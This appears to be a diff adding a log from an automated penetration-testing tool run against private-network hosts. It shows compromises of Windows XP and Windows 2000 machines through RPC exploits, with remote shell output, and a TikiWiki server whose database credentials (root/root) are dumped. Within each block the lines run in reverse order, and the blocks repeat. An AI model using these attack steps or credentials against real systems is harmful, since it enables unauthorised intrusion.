@@ -1,0 +1,416 @@
+Penetrate host 192.168.4.5 ......Please wait!
+
+
+          RX bytes:15625791 (14.9 MB)  TX bytes:15625791 (14.9 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:31310 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:31310 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:18 Base address:0x2000 
+          RX bytes:66989422 (63.8 MB)  TX bytes:19159356 (18.2 MB)
+          collisions:0 txqueuelen:1000 
+          TX packets:84491 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:624416 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe94:7f2c/64 Scope:Link
+          inet addr:192.168.4.5  Bcast:192.168.4.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:94:7f:2c  
+[*] The penetration testing success
+[*] Successfully sent exploit request
+[*] Started bind handler
+Penetrate host 192.168.4.5 ......Please wait!
+
+
+          RX bytes:15638147 (14.9 MB)  TX bytes:15638147 (14.9 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:31335 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:31335 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:18 Base address:0x2000 
+          RX bytes:66995375 (63.8 MB)  TX bytes:19171153 (18.2 MB)
+          collisions:0 txqueuelen:1000 
+          TX packets:84511 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:624487 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe94:7f2c/64 Scope:Link
+          inet addr:192.168.4.5  Bcast:192.168.4.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:94:7f:2c  
+[*] The penetration testing success
+[*] Successfully sent exploit request
+[*] Started bind handler
+penetrate 192.168.4.5 success
+C:\WINDOWS\system32>
+
+        Default Gateway . . . . . . . . . : 192.168.3.1
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        IP Address. . . . . . . . . . . . : 192.168.3.4
+        Connection-specific DNS Suffix  . : 
+
+Ethernet adapter 本地连接:
+
+
+Windows IP Configuration
+
+C:\WINDOWS\system32>C:\WINDOWS\System32\ipconfig.exe
+
+(C) 版权所有 1985-2001 Microsoft Corp.
+[*] Microsoft Windows XP [版本 5.1.2600]
+[*] The penetration testing success
+[*] Sending stage (240 bytes) to 192.168.3.4
+[*] Attempting to trigger the vulnerability...
+[*] Selected Target: Windows XP SP0/SP1 Universal
+[*] Fingerprint: Windows XP - Service Pack 0 / 1 - lang:Chinese - Traditional
+[*] Automatically detecting the target...
+[*] Started bind handler
+
+
+          RX bytes:15638147 (14.9 MB)  TX bytes:15638147 (14.9 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:31335 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:31335 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:18 Base address:0x2000 
+          RX bytes:66995375 (63.8 MB)  TX bytes:19171153 (18.2 MB)
+          collisions:0 txqueuelen:1000 
+          TX packets:84511 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:624487 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe94:7f2c/64 Scope:Link
+          inet addr:192.168.4.5  Bcast:192.168.4.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:94:7f:2c  
+[*] The penetration testing success
+[*] Successfully sent exploit request
+[*] Started bind handler
+penetrate 192.168.3.4 success
+
+
+          RX bytes:4268725 (4.0 MB)  TX bytes:4268725 (4.0 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:8525 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:8525 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:16 Base address:0x2000 
+          RX bytes:608722 (594.4 KB)  TX bytes:719554 (702.6 KB)
+          collisions:0 txqueuelen:1000 
+          TX packets:2408 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:7420 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe35:17c3/64 Scope:Link
+          inet addr:192.168.2.3  Bcast:192.168.2.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:35:17:c3  
+[*] The penetration testing success
+[*] Attempting to execute our payload...
+
+dbs_tiki  : tikiwiki195
+pass_tiki : root
+user_tiki : root
+host_tiki : localhost
+dbversion : 1.9
+db_tiki   : mysql
+
+[*] TikiWiki database informations : 
+[*] Server version                 : Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+[*] The server returned            : 200 OK
+[*] Attempting to obtain database credentials...
+[*] Started bind handler
+C:\WINDOWS\system32>
+
+        Default Gateway . . . . . . . . . : 192.168.3.1
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        IP Address. . . . . . . . . . . . : 192.168.3.4
+        Connection-specific DNS Suffix  . : 
+
+Ethernet adapter 本地连接:
+
+
+Windows IP Configuration
+
+C:\WINDOWS\system32>C:\WINDOWS\System32\ipconfig.exe
+
+(C) 版权所有 1985-2001 Microsoft Corp.
+[*] Microsoft Windows XP [版本 5.1.2600]
+[*] The penetration testing success
+[*] Sending stage (240 bytes) to 192.168.3.4
+[*] Attempting to trigger the vulnerability...
+[*] Selected Target: Windows XP SP0/SP1 Universal
+[*] Fingerprint: Windows XP - Service Pack 0 / 1 - lang:Chinese - Traditional
+[*] Automatically detecting the target...
+[*] Started bind handler
+
+
+          RX bytes:15638147 (14.9 MB)  TX bytes:15638147 (14.9 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:31335 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:31335 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:18 Base address:0x2000 
+          RX bytes:66995375 (63.8 MB)  TX bytes:19171153 (18.2 MB)
+          collisions:0 txqueuelen:1000 
+          TX packets:84511 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:624487 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe94:7f2c/64 Scope:Link
+          inet addr:192.168.4.5  Bcast:192.168.4.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:94:7f:2c  
+[*] The penetration testing success
+[*] Successfully sent exploit request
+[*] Started bind handler
+penetrate 192.168.2.3 success
+
+
+          RX bytes:15646323 (14.9 MB)  TX bytes:15646323 (14.9 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:31351 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:31351 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:18 Base address:0x2000 
+          RX bytes:66999106 (63.8 MB)  TX bytes:19172932 (18.2 MB)
+          collisions:0 txqueuelen:1000 
+          TX packets:84524 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:624536 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe94:7f2c/64 Scope:Link
+          inet addr:192.168.4.5  Bcast:192.168.4.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:94:7f:2c  
+[*] The penetration testing success
+[*] The remote distccd did not reply to our request
+[*] Started bind handler
+
+
+          RX bytes:4268725 (4.0 MB)  TX bytes:4268725 (4.0 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:8525 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:8525 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:16 Base address:0x2000 
+          RX bytes:608722 (594.4 KB)  TX bytes:719554 (702.6 KB)
+          collisions:0 txqueuelen:1000 
+          TX packets:2408 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:7420 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe35:17c3/64 Scope:Link
+          inet addr:192.168.2.3  Bcast:192.168.2.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:35:17:c3  
+[*] The penetration testing success
+[*] Attempting to execute our payload...
+
+dbs_tiki  : tikiwiki195
+pass_tiki : root
+user_tiki : root
+host_tiki : localhost
+dbversion : 1.9
+db_tiki   : mysql
+
+[*] TikiWiki database informations : 
+[*] Server version                 : Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+[*] The server returned            : 200 OK
+[*] Attempting to obtain database credentials...
+[*] Started bind handler
+C:\WINDOWS\system32>
+
+        Default Gateway . . . . . . . . . : 192.168.3.1
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        IP Address. . . . . . . . . . . . : 192.168.3.4
+        Connection-specific DNS Suffix  . : 
+
+Ethernet adapter 本地连接:
+
+
+Windows IP Configuration
+
+C:\WINDOWS\system32>C:\WINDOWS\System32\ipconfig.exe
+
+(C) 版权所有 1985-2001 Microsoft Corp.
+[*] Microsoft Windows XP [版本 5.1.2600]
+[*] The penetration testing success
+[*] Sending stage (240 bytes) to 192.168.3.4
+[*] Attempting to trigger the vulnerability...
+[*] Selected Target: Windows XP SP0/SP1 Universal
+[*] Fingerprint: Windows XP - Service Pack 0 / 1 - lang:Chinese - Traditional
+[*] Automatically detecting the target...
+[*] Started bind handler
+
+
+          RX bytes:15638147 (14.9 MB)  TX bytes:15638147 (14.9 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:31335 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:31335 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:18 Base address:0x2000 
+          RX bytes:66995375 (63.8 MB)  TX bytes:19171153 (18.2 MB)
+          collisions:0 txqueuelen:1000 
+          TX packets:84511 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:624487 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe94:7f2c/64 Scope:Link
+          inet addr:192.168.4.5  Bcast:192.168.4.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:94:7f:2c  
+[*] The penetration testing success
+[*] Successfully sent exploit request
+[*] Started bind handler
+penetrate 192.168.4.5 success
+C:\WINDOWS\system32>
+
+	Default Gateway . . . . . . . . . : 192.168.3.1
+	Subnet Mask . . . . . . . . . . . : 255.255.255.0
+	IP Address. . . . . . . . . . . . : 192.168.3.5
+	Connection-specific DNS Suffix  . : 
+
+Ethernet adapter 本地连接:
+
+Windows 2000 IP Configuration
+
+C:\WINDOWS\system32>C:\WINDOWS\System32\ipconfig.exe
+
+(C) 版权所有 1985-1998 Microsoft Corp.
+[*] Microsoft Windows 2000 [Version 5.00.2195]
+[*] The penetration testing success
+[*] Sending stage (240 bytes) to 192.168.3.5
+[*] Sending exploit ...
+[*] Bound to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.3.5[135] ...
+[*] Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.3.5[135] ...
+[*] Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
+[*] Started bind handler
+
+
+          RX bytes:15646323 (14.9 MB)  TX bytes:15646323 (14.9 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:31351 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:31351 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:18 Base address:0x2000 
+          RX bytes:66999106 (63.8 MB)  TX bytes:19172932 (18.2 MB)
+          collisions:0 txqueuelen:1000 
+          TX packets:84524 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:624536 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe94:7f2c/64 Scope:Link
+          inet addr:192.168.4.5  Bcast:192.168.4.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:94:7f:2c  
+[*] The penetration testing success
+[*] The remote distccd did not reply to our request
+[*] Started bind handler
+
+
+          RX bytes:4268725 (4.0 MB)  TX bytes:4268725 (4.0 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:8525 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:8525 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:16 Base address:0x2000 
+          RX bytes:608722 (594.4 KB)  TX bytes:719554 (702.6 KB)
+          collisions:0 txqueuelen:1000 
+          TX packets:2408 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:7420 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe35:17c3/64 Scope:Link
+          inet addr:192.168.2.3  Bcast:192.168.2.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:35:17:c3  
+[*] The penetration testing success
+[*] Attempting to execute our payload...
+
+dbs_tiki  : tikiwiki195
+pass_tiki : root
+user_tiki : root
+host_tiki : localhost
+dbversion : 1.9
+db_tiki   : mysql
+
+[*] TikiWiki database informations : 
+[*] Server version                 : Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch
+[*] The server returned            : 200 OK
+[*] Attempting to obtain database credentials...
+[*] Started bind handler
+C:\WINDOWS\system32>
+
+        Default Gateway . . . . . . . . . : 192.168.3.1
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        IP Address. . . . . . . . . . . . : 192.168.3.4
+        Connection-specific DNS Suffix  . : 
+
+Ethernet adapter 本地连接:
+
+
+Windows IP Configuration
+
+C:\WINDOWS\system32>C:\WINDOWS\System32\ipconfig.exe
+
+(C) 版权所有 1985-2001 Microsoft Corp.
+[*] Microsoft Windows XP [版本 5.1.2600]
+[*] The penetration testing success
+[*] Sending stage (240 bytes) to 192.168.3.4
+[*] Attempting to trigger the vulnerability...
+[*] Selected Target: Windows XP SP0/SP1 Universal
+[*] Fingerprint: Windows XP - Service Pack 0 / 1 - lang:Chinese - Traditional
+[*] Automatically detecting the target...
+[*] Started bind handler
+
+
+          RX bytes:15638147 (14.9 MB)  TX bytes:15638147 (14.9 MB)
+          collisions:0 txqueuelen:0 
+          TX packets:31335 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:31335 errors:0 dropped:0 overruns:0 frame:0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          inet6 addr: ::1/128 Scope:Host
+          inet addr:127.0.0.1  Mask:255.0.0.0
+lo        Link encap:Local Loopback  
+
+          Interrupt:18 Base address:0x2000 
+          RX bytes:66995375 (63.8 MB)  TX bytes:19171153 (18.2 MB)
+          collisions:0 txqueuelen:1000 
+          TX packets:84511 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:624487 errors:0 dropped:0 overruns:0 frame:0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          inet6 addr: fe80::20c:29ff:fe94:7f2c/64 Scope:Link
+          inet addr:192.168.4.5  Bcast:192.168.4.255  Mask:255.255.255.0
+[*] eth0      Link encap:Ethernet  HWaddr 00:0c:29:94:7f:2c  
+[*] The penetration testing success
+[*] Successfully sent exploit request
+[*] Started bind handler
+penetrate 192.168.3.5 success
+Penetrate host 192.168.1.20 ......Please wait!
+[*] The penetration testing fail
+[-] Exploit exception: The host (192.168.1.20:3632) was unreachable.
+[*] Started bind handler
+penetrate 192.168.1.20 fail
+Penetrate host 10.2.1.22 ......Please wait!
